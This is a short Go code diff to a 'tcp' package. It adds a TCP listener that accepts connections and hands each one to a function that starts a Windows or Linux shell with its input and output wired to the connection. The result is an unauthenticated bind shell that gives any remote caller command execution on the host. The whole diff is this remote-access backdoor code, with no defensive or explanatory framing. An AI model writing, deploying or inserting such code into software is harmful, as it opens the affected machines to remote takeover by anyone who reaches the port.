@@ -3,6 +3,7 @@ package tcp
 import (
 	"fmt"
 	"io"
+	"log"
 	"net"
 	"os/exec"
 )
@@ -14,7 +15,6 @@ func Exec(conn net.Conn, host string) {
 		cmd := exec.Command(env[0])
 		fmt.Println("cmd := ", cmd)
 		rp, wp := io.Pipe()
-		// Set stdin to our connection
 		cmd.Stdin = conn
 		cmd.Stdout = wp
 		go io.Copy(conn, rp)
@@ -23,7 +23,6 @@ func Exec(conn net.Conn, host string) {
 	}
 	if host == "linux" {
 		cmd := exec.Command(env[1], env[2])
-		fmt.Println("cmd := ", cmd)
 		rp, wp := io.Pipe()
 		// Set stdin to our connection
 		cmd.Stdin = conn
@@ -31,5 +30,22 @@ func Exec(conn net.Conn, host string) {
 		go io.Copy(conn, rp)
 		cmd.Run()
 		conn.Close()
+	}
+}
+
+// StartExec launches the execution terminal for
+// the type of host either windows or linux
+func StartExec(host, port string) {
+	listener, err := net.Listen("tcp", port)
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			log.Fatalln(err)
+		}
+		go Exec(conn, host)
 	}
 }
